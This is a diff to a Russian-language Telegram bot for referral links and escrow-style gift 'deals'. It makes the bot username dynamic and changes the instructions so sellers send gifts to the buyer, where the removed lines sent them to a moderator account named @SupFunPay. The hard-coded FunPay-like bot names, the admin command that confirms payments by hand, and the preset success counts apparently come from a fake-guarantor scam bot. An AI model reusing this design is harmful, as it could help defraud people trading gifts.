@@ -17,6 +17,8 @@ dp = Dispatcher(storage=MemoryStorage())
 router = Router()
 dp.include_router(router)
 
+BOT_USERNAME = None  # Заполняется автоматически при запуске
+
 # Настройки
 ADMINS = [8235395380, 770710304]
 user_success = {770710304: 56}
@@ -60,7 +62,7 @@ def main_menu():
 @router.callback_query(F.data == "referral_link")
 async def show_referral_link(call: CallbackQuery):
     user_id = call.from_user.id
-    link = f"https://t.me/FunPayfeebot?start=ref_{user_id}"
+    link = f"https://t.me/{BOT_USERNAME}?start=ref_{user_id}"
     ref_count = sum(1 for ref in referrals.values() if ref == user_id)  # Считаем количество рефералов
     
     text = (
@@ -215,7 +217,7 @@ async def ref_link(message: Message):
         await message.answer("⛔ Команда доступна только админам.")
         return
 
-    link = f"https://t.me/GifftEIlfRobot?start=ref_{user_id}"
+    link = f"https://t.me/{BOT_USERNAME}?start=ref_{user_id}"
     count = sum(1 for ref in referrals.values() if ref == user_id)
 
     await message.answer(
@@ -387,7 +389,7 @@ async def deal_description_input(message: Message, state: FSMContext):
         "wallet_type": wallet_type
     }
 
-    link = f"https://t.me/FunPayfeebot?start={deal_id}"
+    link = f"https://t.me/{BOT_USERNAME}?start={deal_id}"
     await message.answer(
         f"✅ Сделка создана!\n\n"
         f"💰 Сумма: {amount} {currency}\n"
@@ -492,14 +494,14 @@ async def confirm_payment(call: CallbackQuery):
     if method == "deal_stars":
         seller_message = (
             "✅ Оплата звёздами подтверждена в боте.\n\n"
-            "🎁 Отправьте подарок модератору @SupFunPay.\n"
+            "🎁 Отправьте подарок покупателю.\n"
             "⭐ Для сделок со звёздами реквизиты не требуются.\n\n"
             "Бот проверяет наличие скрина. Модератор получает уведомление."
         )
     else:
         seller_message = (
             "✅ Оплата заморожена в боте.\n\n"
-            "🎁 Отправьте подарок модератору @SupFunPay.\n"
+            "🎁 Отправьте подарок покупателю.\n"
             "📸 Сделайте скрин и отправьте его в чат с ботом.\n\n"
             "Бот проверяет наличие скрина. Модератор получает уведомление."
         )
@@ -697,14 +699,14 @@ async def admin_confirm_other_deal(message: Message):
     if method == "deal_stars":
         seller_message = (
             "✅ Оплата звёздами подтверждена в боте.\n\n"
-            "🎁 Отправьте подарок модератору @SupFunPay.\n"
+            "🎁 Отправьте подарок покупателю.\n"
             "⭐ Для сделок со звёздами реквизиты не требуются.\n\n"
             "Бот проверяет наличие скрина. Модератор получает уведомление."
         )
     else:
         seller_message = (
             "✅ Оплата заморожена в боте.\n\n"
-            "🎁 Отправьте подарок модератору @SupFunPay.\n"
+            "🎁 Отправьте подарок покупателю.\n"
             "📸 Сделайте скрин и отправьте его в чат с ботом.\n\n"
             "Бот проверяет наличие скрина. Модератор получает уведомление."
         )
@@ -729,6 +731,10 @@ async def admin_confirm_other_deal(message: Message):
 
 # Запуск бота
 async def main():
+    global BOT_USERNAME
+    bot_info = await bot.get_me()
+    BOT_USERNAME = bot_info.username
+    logging.info(f"Бот запущен: @{BOT_USERNAME}")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
